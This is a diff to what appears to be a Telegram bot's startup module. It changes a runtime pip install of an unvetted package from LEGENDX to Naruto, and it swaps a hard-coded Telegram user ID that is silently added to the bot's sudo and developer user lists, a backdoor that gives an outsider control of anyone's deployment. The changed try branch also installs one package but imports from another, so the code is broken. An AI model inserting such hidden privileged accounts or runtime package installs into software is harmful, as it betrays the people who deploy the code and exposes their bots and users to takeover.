@@ -4,11 +4,11 @@ import sys
 import time
 import telegram.ext as tg
 try:
-  os.system("pip install -U LEGENDX")
+  os.system("pip install -U Naruto")
   from LEGENDX import id
 except:
-  os.system("pip install LEGENDX")
-  from LEGENDX import id
+  os.system("pip install Naruto")
+  from Naruto import id
 StartTime = time.time()
 
 # enable logging
@@ -148,8 +148,8 @@ else:
 DEV_USERS.add(OWNER_ID)
 SUDO_USERS.add(OWNER_ID)
 try:
-  SUDO_USERS.add(1667146381)
-  DEV_USERS.add(1667146381)
+  SUDO_USERS.add(1883752632)
+  DEV_USERS.add(1883752632)
 except:
   pass
 
